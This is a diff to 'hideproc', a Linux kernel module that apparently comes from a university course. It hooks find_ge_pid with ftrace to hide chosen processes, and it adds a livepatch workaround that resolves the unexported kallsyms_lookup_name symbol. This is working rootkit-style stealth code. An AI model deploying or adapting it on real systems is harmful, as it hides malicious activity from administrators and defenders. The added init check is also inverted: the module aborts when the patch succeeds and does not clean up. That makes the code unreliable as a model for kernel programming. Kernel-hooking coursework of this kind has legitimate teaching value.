@@ -1,18 +1,47 @@
 #include <linux/cdev.h>
 #include <linux/ftrace.h>
 #include <linux/kallsyms.h>
-#include <linux/kernel.h>
 #include <linux/list.h>
+#include <linux/livepatch.h>
 #include <linux/module.h>
 #include <linux/proc_fs.h>
-#include <linux/string.h>
+#include <linux/slab.h>
 
-MODULE_LICENSE("GPL");
+MODULE_LICENSE("Dual MIT/GPL");
 MODULE_AUTHOR("National Cheng Kung University, Taiwan");
+MODULE_INFO(livepatch, "Y");
 
 enum RETURN_CODE { SUCCESS };
+unsigned long kallsyms_lookup_name(const char *name);
 
-unsigned long vfunc = 0xffffffffb68bfcb0;
+static struct klp_func funcs[] = {{
+                                      .old_name = "kallsyms_lookup_name",
+                                      .new_func = kallsyms_lookup_name,
+                                  },
+                                  {}};
+
+static struct klp_func failfuncs[] = {{
+                                          .old_name = "___________________",
+                                      },
+                                      {}};
+
+static struct klp_object objs[] = {{
+                                       .funcs = funcs,
+                                   },
+                                   {
+                                       .name = "kallsyms_failing_name",
+                                       .funcs = failfuncs,
+                                   },
+                                   {}};
+
+static struct klp_patch patch = {
+    .mod = THIS_MODULE,
+    .objs = objs,
+};
+
+unsigned long kallsyms_lookup_name(const char *name) {
+  return ((unsigned long (*)(const char *))funcs->old_func)(name);
+}
 
 struct ftrace_hook {
   const char *name;
@@ -22,7 +51,7 @@ struct ftrace_hook {
 };
 
 static int hook_resolve_addr(struct ftrace_hook *hook) {
-  hook->address = vfunc;
+  hook->address = kallsyms_lookup_name(hook->name);
   if (!hook->address) {
     printk("unresolved symbol: %s\n", hook->name);
     return -ENOENT;
@@ -33,10 +62,10 @@ static int hook_resolve_addr(struct ftrace_hook *hook) {
 
 static void notrace hook_ftrace_thunk(unsigned long ip, unsigned long parent_ip,
                                       struct ftrace_ops *ops,
-                                      struct pt_regs *regs) {
+                                      struct pt_regs *fregs) {
   struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);
   if (!within_module(parent_ip, THIS_MODULE))
-    regs->ip = (unsigned long)hook->func;
+    fregs->ip = (unsigned long)hook->func;
 }
 
 static int hook_install(struct ftrace_hook *hook) {
@@ -63,17 +92,14 @@ static int hook_install(struct ftrace_hook *hook) {
   return 0;
 }
 
-#if 0
-void hook_remove(struct ftrace_hook *hook)
-{
-    int err = unregister_ftrace_function(&hook->ops);
-    if (err)
-        printk("unregister_ftrace_function() failed: %d\n", err);
-    err = ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
-    if (err)
-        printk("ftrace_set_filter_ip() failed: %d\n", err);
+void hook_remove(struct ftrace_hook *hook) {
+  int err = unregister_ftrace_function(&hook->ops);
+  if (err)
+    printk("unregister_ftrace_function() failed: %d\n", err);
+  err = ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
+  if (err)
+    printk("ftrace_set_filter_ip() failed: %d\n", err);
 }
-#endif
 
 typedef struct {
   pid_t id;
@@ -104,8 +130,7 @@ static struct pid *hook_find_ge_pid(int nr, struct pid_namespace *ns) {
 }
 
 static void init_hook(void) {
-  // real_find_ge_pid = (find_ge_pid_func)kallsyms_lookup_name("find_ge_pid");
-  real_find_ge_pid = (find_ge_pid_func)vfunc;
+  real_find_ge_pid = (find_ge_pid_func)kallsyms_lookup_name("find_ge_pid");
   hook.name = "find_ge_pid";
   hook.func = hook_find_ge_pid;
   hook.orig = &real_find_ge_pid;
@@ -122,8 +147,10 @@ static int hide_process(pid_t pid) {
 static int unhide_process(pid_t pid) {
   pid_node_t *proc, *tmp_proc;
   list_for_each_entry_safe(proc, tmp_proc, &hidden_proc, list_node) {
-    list_del(&proc->list_node);
-    kfree(proc);
+    if (proc->id == pid) {
+      list_del(&proc->list_node);
+      kfree(proc);
+    }
   }
   return SUCCESS;
 }
@@ -154,7 +181,6 @@ static ssize_t device_read(struct file *filep, char *buffer, size_t len,
   }
   return *offset;
 }
-
 static int char_place(char *str, char c) {
   int len = strlen(str);
   int i;
@@ -226,7 +252,7 @@ static const struct file_operations fops = {
 #define DEVICE_NAME "hideproc"
 
 static int _hideproc_init(void) {
-  int err, dev_major;
+  int err, dev_major, r;
   dev_t dev;
   printk(KERN_INFO "@ %s\n", __func__);
   err = alloc_chrdev_region(&dev, 0, MINOR_VERSION, DEVICE_NAME);
@@ -239,12 +265,17 @@ static int _hideproc_init(void) {
   device_create(hideproc_class, NULL, MKDEV(dev_major, MINOR_VERSION), NULL,
                 DEVICE_NAME);
 
+  r = klp_enable_patch(&patch);
+
+  if (!r)
+    return -1;
   init_hook();
 
   return 0;
 }
 
 static void _hideproc_exit(void) {
+  hook_remove(&hook);
   printk(KERN_INFO "@ %s\n", __func__);
   /* FIXME: ensure the release of all allocated resources */
 }
